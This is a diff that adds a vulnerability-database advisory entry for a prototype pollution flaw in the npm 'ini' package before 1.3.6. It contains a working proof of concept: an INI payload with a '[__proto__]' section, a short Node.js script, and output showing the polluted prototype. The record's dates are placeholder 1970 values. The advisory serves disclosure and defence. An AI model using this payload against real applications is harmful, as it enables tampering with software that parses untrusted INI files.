@@ -1,0 +1,51 @@
+---
+- id: npmjs:npm:ini:1589
+  title: Prototype Pollution
+  description: |-
+    `ini` before version 1.3.6 has a Prototype Pollution vulnerability.
+
+    ### Impact
+
+    If an attacker submits a malicious INI file to an application that parses it with `ini.parse`, they will pollute the prototype on the application. This can be exploited further depending on the context.
+
+    ### Patches
+
+    This has been patched in 1.3.6
+
+    ### Steps to reproduce
+
+    payload.ini
+    ```
+    [__proto__]
+    polluted = "polluted"
+    ```
+
+    poc.js:
+    ```
+    var fs = require('fs')
+    var ini = require('ini')
+
+    var parsed = ini.parse(fs.readFileSync('./payload.ini', 'utf-8'))
+    console.log(parsed)
+    console.log(parsed.__proto__)
+    console.log(polluted)
+    ```
+
+    ```
+    > node poc.js
+    {}
+    { polluted: 'polluted' }
+    { polluted: 'polluted' }
+    polluted
+
+    ```
+  affected_package: ini
+  vulnerable_versions:
+  - "<1.3.6"
+  severity: low
+  package_manager: npm
+  cwe: CWE-471
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Anonymous
